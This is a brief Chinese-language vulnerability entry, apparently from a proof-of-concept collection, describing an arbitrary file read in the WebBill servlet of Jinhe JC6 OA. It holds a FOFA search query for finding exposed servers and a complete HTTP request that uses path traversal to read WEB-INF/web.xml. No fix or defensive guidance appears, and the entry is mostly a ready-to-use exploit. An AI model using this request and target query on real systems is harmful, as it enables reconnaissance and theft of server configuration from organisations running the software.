## 金和 JC6 WebBill 任意文件读取漏洞

## 漏洞描述
金和 JC6 OA 的 `WebBill` 接口存在任意文件读取漏洞，攻击者可读取服务器敏感信息。

## 网络空间测绘
```
fofa: app="金和网络-金和OA"
```

## POC
```
GET /jc6/servlet/WebBill?Key=GetFileContent&pathfile=../WEB-INF/web.xml HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
```

## 参考
- 社区情报

